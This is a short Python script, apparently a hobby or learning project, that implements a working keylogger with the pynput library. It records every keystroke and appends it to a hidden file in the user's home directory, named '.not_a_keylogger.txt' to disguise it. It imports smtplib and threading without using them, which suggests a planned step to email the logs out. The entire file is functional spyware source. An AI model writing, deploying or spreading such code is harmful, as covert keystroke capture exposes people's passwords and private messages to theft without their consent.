#!/usr/bin/python
import pynput.keyboard
import smtplib
import threading
import os
from pathlib import Path


class Keylogger:

	def __init__(self):
		#constructor
		HOME = str(Path.home())
		self.filepath = f"{HOME}/.not_a_keylogger.txt"
		self.header = "[ Initiating Logging ]\n"


	def evaluate_keys(self, key):
		try: 
			# This will not throw exceptions when encountering a special character
			Pressed_key = str(key.char)
		except AttributeError:
			if key == key.space:	# Show actual space instead of key.space
				Pressed_key =  " "
			elif key == key.enter:
				Pressed_key = "\n"
			else:
				Pressed_key =  " " + str(key) + " "

		#Now appending the key pressed		
		self.log(Pressed_key)

	def log(self, logger_text):
		FILE_MODE = "a+"
	
		with open(f'{self.filepath}', FILE_MODE) as logfile:
			logfile.write(logger_text)

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
		with keyboard_listener:
			self.log(self.header)
			keyboard_listener.join()

if __name__ == "__main__":
	my_keylogger = Keylogger()
	my_keylogger.start()